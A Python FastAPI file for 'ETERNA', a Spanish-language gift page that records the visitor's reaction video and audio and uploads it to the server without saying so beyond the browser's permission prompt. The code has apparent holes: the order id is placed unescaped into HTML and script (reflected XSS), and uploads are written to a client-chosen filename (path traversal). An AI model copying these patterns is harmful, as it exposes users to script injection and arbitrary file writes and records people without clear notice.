from pathlib import Path
from fastapi import FastAPI, UploadFile, File
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles

app = FastAPI(title="ETERNA")

# =========================
# CARPETAS
# =========================

BASE_DIR = Path(__file__).resolve().parent
STATIC_DIR = BASE_DIR / "static"
REACTIONS_DIR = BASE_DIR / "reacciones"

STATIC_DIR.mkdir(exist_ok=True)
REACTIONS_DIR.mkdir(exist_ok=True)

# Montar archivos estáticos
app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")


# =========================
# HOME SIMPLE
# =========================

@app.get("/", response_class=HTMLResponse)
def home():
    return """
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ETERNA</title>
        <style>
            body{
                margin:0;
                min-height:100vh;
                display:flex;
                align-items:center;
                justify-content:center;
                background:#000;
                color:#fff;
                font-family:Arial, sans-serif;
                text-align:center;
                padding:20px;
            }
            a{
                color:#fff;
                text-decoration:none;
                border:1px solid rgba(255,255,255,0.25);
                padding:14px 22px;
                border-radius:999px;
                display:inline-block;
                margin-top:20px;
            }
        </style>
    </head>
    <body>
        <div>
            <h1>ETERNA</h1>
            <p>Prueba la experiencia aquí:</p>
            <a href="/pedido/test123">Abrir ETERNA de prueba</a>
        </div>
    </body>
    </html>
    """


# =========================
# EXPERIENCIA ETERNA
# =========================

@app.get("/pedido/{order_id}", response_class=HTMLResponse)
def ver_eterna(order_id: str):
    inicio_img = "/static/eterna_inicio.jpg"
    final_img = "/static/eterna_final.jpg"

    return f"""
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ETERNA</title>

    <style>
        * {{
            box-sizing: border-box;
        }}

        html, body {{
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }}

        .pantalla {{
            position: fixed;
            inset: 0;
            width: 100%;
            height: 100%;
            display: none;
            align-items: center;
            justify-content: center;
            text-align: center;
            overflow: hidden;
            background:
                radial-gradient(circle at top, rgba(255,255,255,0.08), transparent 35%),
                linear-gradient(180deg, #0a0a0a 0%, #000 100%);
        }}

        .pantalla.activa {{
            display: flex;
        }}

        .fondo {{
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0;
            transition: opacity 0.8s ease;
            filter: brightness(0.45);
        }}

        .fondo.visible {{
            opacity: 1;
        }}

        .overlay {{
            position: absolute;
            inset: 0;
            background: linear-gradient(
                180deg,
                rgba(0,0,0,0.35) 0%,
                rgba(0,0,0,0.55) 45%,
                rgba(0,0,0,0.80) 100%
            );
        }}

        .contenido {{
            position: relative;
            z-index: 2;
            max-width: 760px;
            padding: 28px;
        }}

        h1 {{
            margin: 0 0 16px;
            font-size: clamp(34px, 6vw, 56px);
            font-weight: 500;
            letter-spacing: 0.5px;
        }}

        p {{
            margin: 0 auto;
            max-width: 560px;
            font-size: clamp(16px, 2.5vw, 21px);
            line-height: 1.6;
            color: rgba(255,255,255,0.92);
        }}

        .micro {{
            margin-top: 18px;
            font-size: 13px;
            color: rgba(255,255,255,0.62);
        }}

        button {{
            margin-top: 28px;
            padding: 15px 26px;
            font-size: 16px;
            border: 0;
            border-radius: 999px;
            background: rgba(255,255,255,0.95);
            color: #000;
            cursor: pointer;
            min-width: 190px;
        }}

        button:hover {{
            transform: scale(1.02);
        }}

        .fila-botones {{
            display: flex;
            gap: 14px;
            justify-content: center;
            flex-wrap: wrap;
            margin-top: 28px;
        }}

        .btn-secundario {{
            background: rgba(255,255,255,0.14);
            color: #fff;
            border: 1px solid rgba(255,255,255,0.18);
        }}

        #preview {{
            position: fixed;
            right: 14px;
            bottom: 14px;
            width: 118px;
            max-width: 28vw;
            border-radius: 16px;
            overflow: hidden;
            z-index: 20;
            background: #111;
            border: 1px solid rgba(255,255,255,0.15);
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.5s ease;
        }}

        #preview.visible {{
            opacity: 0.82;
        }}

        #experiencia {{
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 8;
            background:
                radial-gradient(circle at center, rgba(255,255,255,0.05), transparent 35%),
                #000;
            padding: 30px;
        }}

        #experiencia.activa {{
            display: flex;
        }}

        .regalo {{
            animation: aparecer 1.2s ease forwards;
            opacity: 0;
        }}

        .regalo h2 {{
            margin: 0 0 12px;
            font-size: clamp(28px, 7vw, 60px);
            font-weight: 500;
        }}

        .regalo p {{
            font-size: clamp(16px, 3vw, 22px);
            color: rgba(255,255,255,0.86);
        }}

        @keyframes aparecer {{
            from {{
                opacity: 0;
                transform: translateY(8px);
            }}
            to {{
                opacity: 1;
                transform: translateY(0);
            }}
        }}
    </style>
</head>
<body>

    <!-- INICIO -->
    <section id="inicio" class="pantalla activa">
        <img id="imgInicio" class="fondo" src="{inicio_img}" alt="ETERNA inicio">
        <div class="overlay"></div>

        <div class="contenido">
            <h1>Tu ETERNA está aquí</h1>
            <p>
                Al continuar, aceptas vivirla tal y como fue creada.
                <br>
                Solo entonces podrá comenzar.
            </p>
            <div class="micro">
                Experiencia única. Sin pausas. Sin repetirla.
            </div>
            <button onclick="iniciarExperiencia()">Aceptar ETERNA</button>
        </div>
    </section>

    <!-- EXPERIENCIA -->
    <section id="experiencia">
        <div class="regalo">
            <h2>Hay algo para ti</h2>
            <p>Vívelo por completo.</p>
        </div>
    </section>

    <!-- FINAL -->
    <section id="final" class="pantalla">
        <img id="imgFinal" class="fondo" src="{final_img}" alt="ETERNA final">
        <div class="overlay"></div>

        <div class="contenido">
            <h1>Este momento ya es tuyo</h1>
            <p>
                Puedes guardarlo o compartirlo.
            </p>

            <div class="fila-botones">
                <button onclick="guardarVideo()">Guardar momento</button>
                <button class="btn-secundario" onclick="compartirVideo()">Compartir momento</button>
            </div>
        </div>
    </section>

    <video id="preview" autoplay muted playsinline></video>

    <script>
        let mediaRecorder = null;
        let chunks = [];
        let videoBlob = null;
        let currentStream = null;
        const orderId = "{order_id}";

        function activarSiExiste(imgId) {{
            const img = document.getElementById(imgId);
            img.addEventListener("load", () => {{
                img.classList.add("visible");
            }});
            img.addEventListener("error", () => {{
                img.style.display = "none";
            }});
        }}

        activarSiExiste("imgInicio");
        activarSiExiste("imgFinal");

        function mostrarPantalla(id) {{
            document.getElementById("inicio").classList.remove("activa");
            document.getElementById("final").classList.remove("activa");
            document.getElementById("experiencia").classList.remove("activa");

            const el = document.getElementById(id);
            if (el) el.classList.add("activa");
        }}

        async function iniciarExperiencia() {{
            chunks = [];

            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{
                    video: true,
                    audio: true
                }});

                currentStream = stream;

                const preview = document.getElementById("preview");
                preview.srcObject = stream;
                preview.classList.add("visible");

                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = (e) => {{
                    if (e.data && e.data.size > 0) {{
                        chunks.push(e.data);
                    }}
                }};

                mediaRecorder.onstop = async () => {{
                    videoBlob = new Blob(chunks, {{ type: "video/webm" }});
                    await subirVideo();
                    cerrarCamara();
                    mostrarPantalla("final");
                }};

                mediaRecorder.start();
                mostrarPantalla("experiencia");

                // 2 segundos antes del momento principal
                setTimeout(() => {{
                    mostrarMomento();
                }}, 2000);

            }} catch (error) {{
                alert("Para vivir ETERNA debes aceptar la experiencia completa.");
            }}
        }}

        function mostrarMomento() {{
            const experiencia = document.getElementById("experiencia");
            experiencia.innerHTML = `
                <div class="regalo">
                    <h2>💸 Has recibido un regalo</h2>
                    <p>Este instante es solo tuyo.</p>
                </div>
            `;

            // cortar 10 segundos después
            setTimeout(() => {{
                if (mediaRecorder && mediaRecorder.state !== "inactive") {{
                    mediaRecorder.stop();
                }}
            }}, 10000);
        }}

        async function subirVideo() {{
            if (!videoBlob) return;

            const formData = new FormData();
            formData.append("video", videoBlob, `reaccion_${{orderId}}.webm`);
            formData.append("order_id", orderId);

            try {{
                await fetch("/subir-reaccion", {{
                    method: "POST",
                    body: formData
                }});
            }} catch (error) {{
                console.error("Error subiendo reacción:", error);
            }}
        }}

        function guardarVideo() {{
            if (!videoBlob) {{
                alert("Aún no hay ningún momento guardado.");
                return;
            }}

            const url = URL.createObjectURL(videoBlob);
            const a = document.createElement("a");
            a.href = url;
            a.download = `eterna_${{orderId}}.webm`;
            document.body.appendChild(a);
            a.click();
            a.remove();

            setTimeout(() => URL.revokeObjectURL(url), 1000);
        }}

        async function compartirVideo() {{
            if (!videoBlob) {{
                alert("Aún no hay ningún momento para compartir.");
                return;
            }}

            try {{
                const file = new File([videoBlob], `eterna_${{orderId}}.webm`, {{ type: "video/webm" }});

                if (navigator.share && navigator.canShare && navigator.canShare({{ files: [file] }})) {{
                    await navigator.share({{
                        title: "Mi ETERNA",
                        text: "Quiero compartir este momento.",
                        files: [file]
                    }});
                }} else {{
                    alert("Compartir no disponible en este dispositivo.");
                }}
            }} catch (error) {{
                console.error("Error compartiendo:", error);
            }}
        }}

        function cerrarCamara() {{
            const preview = document.getElementById("preview");
            preview.classList.remove("visible");

            if (currentStream) {{
                currentStream.getTracks().forEach(track => track.stop());
                currentStream = null;
            }}

            preview.srcObject = null;
        }}
    </script>

</body>
</html>
    """


# =========================
# SUBIR REACCIÓN
# =========================

@app.post("/subir-reaccion")
async def subir_reaccion(
    video: UploadFile = File(...),
    order_id: str = File(None)
):
    filename = video.filename or "reaccion.webm"
    file_path = REACTIONS_DIR / filename

    with open(file_path, "wb") as f:
        f.write(await video.read())

    return {
        "ok": True,
        "order_id": order_id,
        "filename": filename
    }
